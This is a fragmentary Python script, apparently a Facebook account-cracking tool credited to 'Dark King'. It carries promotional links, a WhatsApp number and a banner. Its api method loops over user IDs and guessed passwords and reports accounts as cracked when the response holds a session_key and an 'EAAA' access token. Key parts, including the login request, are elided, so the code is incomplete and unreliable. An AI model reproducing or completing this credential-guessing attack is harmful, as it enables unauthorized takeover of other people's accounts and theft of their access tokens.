...
class Main:
	def __init__(self):
		...
		os.system("xdg-open https://www.facebook.com/groups/899073804876196/")
		time.sleep(4)
		os.system("clear")
...
==================[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆]==========================================
		print("\n  ( Programming BY Dark king  )") 
		print("\n  ( Facebook :  𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 )") 
		print("\n  ( WhatsApp +𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟖 )") 
		print(" ( https://github.Darkkingcyber71 )\n") 
===================[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆]==========================================
		print("         [ OK Login Facebook ]")
		print(" -------------------------------------")
		...
		if tanya in ["", " "]:
		    ...
		    os.system(" xdg-open https://www.facebook.com/profile.php?id=100000179311736&mibextid=ZbWKwL")
		    time.sleep(3)		    		   
		    Main()
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [HAMII-OK]:-%s - [HAMII-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HAMII-CP] %s • %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/Darkkingcyber71/")
		exit()
	else:
		Main()
